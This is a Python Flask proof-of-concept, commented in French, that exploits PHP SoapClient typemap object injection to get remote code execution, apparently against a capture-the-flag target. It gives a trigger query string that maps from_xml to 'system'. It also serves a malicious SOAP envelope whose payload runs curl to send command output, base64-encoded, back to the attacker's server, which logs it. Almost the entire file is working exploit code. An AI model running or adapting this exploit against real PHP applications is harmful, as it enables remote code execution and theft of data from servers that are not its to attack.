"""
PoC SoapClient typemap RCE (CVE-like object injection).

Cible : `new SoapClient($_GET[0] ?? null, $_GET[1] ?? null)->bzh();`

Lance ce serveur sur ATTACKER, puis déclenche :

/?bzh=1&1[location]=http://ATTACKER:5000/rce.xml&1[uri]=x
      &1[typemap][0][type_ns]=rce_xmlns
      &1[typemap][0][type_name]=evil
      &1[typemap][0][from_xml]=system

Important : NE PAS envoyer `0=` dans la query — `??` ne convertit pas "" en null,
donc `$_GET[0]=""` ferait échouer le mode non-WSDL. Il faut omettre la clé.
"""

from flask import Flask, request, Response

app = Flask(__name__)

# Remplacer par l'IP/host joignable depuis la cible (gateway docker, public IP, etc.)
ATTACKER = "172.20.0.1:5000"

XML = f"""
<e:Envelope xmlns:e="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:a="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:rce_xmlns="rce_xmlns">
  <e:Body>
    <rce_xmlns:a>
      <evil a:type="rce_xmlns:evil">rce;curl -s http://{ATTACKER}/?flag=$(/getflag|base64 -w0);
      </evil>
    </rce_xmlns:a>
  </e:Body>
</e:Envelope>
""".strip()


@app.route("/rce.xml", methods=["GET", "POST"])
def poc_xml():
    return Response(XML, status=200, mimetype="application/xml")


@app.route("/", methods=["GET"])
def catch():
    print("FLAG:", request.args.get("flag", ""), flush=True)
    return "ok"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
